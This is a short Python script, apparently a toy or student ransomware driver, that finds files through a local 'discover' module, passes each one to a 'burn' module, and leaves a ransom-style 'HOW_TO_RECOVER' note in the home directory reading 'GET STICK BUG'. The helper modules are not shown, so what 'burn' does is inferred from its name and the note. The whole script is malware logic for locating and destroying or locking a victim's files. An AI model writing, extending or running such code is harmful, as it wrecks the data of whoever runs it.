import discover
import burn

archivos=discover.encuentra_archivos()
print(archivos)

for item in archivos:
    burn.main(item)

with open("~/HOW_TO_RECOVER",'wb') as file:
    file.write("GET STICK BUG")
